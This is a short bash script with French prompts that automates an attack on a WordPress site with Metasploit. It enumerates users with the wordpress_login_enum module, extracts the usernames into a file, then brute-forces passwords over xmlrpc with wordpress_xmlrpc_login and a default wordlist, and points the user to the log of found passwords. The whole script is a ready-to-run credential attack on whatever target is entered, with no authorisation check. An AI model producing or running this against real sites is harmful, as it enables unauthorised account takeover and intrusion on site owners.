#!/bin/bash
read -p "entrer le nom de la cible : " target

cat > /tmp/wpattack.rc <<EOF
spool /tmp/msf_enum.log
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS $target
set RPORT 443
set SSL true
set THREADS 5
run
back
spool off
exit
EOF

msfconsole -r /tmp/wpattack.rc

grep -iE 'found user' /tmp/msf_enum.log | awk '{print $6}' | sort -u | tr -d "'" > /tmp/wpusers.txt



cat > /tmp/wpattack2.rc <<EOF
spool /tmp/msf_password_found.log
use auxiliary/scanner/http/wordpress_xmlrpc_login
show options
set RPORT 443
set SSL true 
set rhost $target
set USER_FILE /tmp/wpusers.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
set STOP_ON_SUCCESS true
set THREADS 1 
run
exit
EOF

msfconsole -r /tmp/wpattack2.rc

echo "regarder dans /tmp/msf_password_found.log"
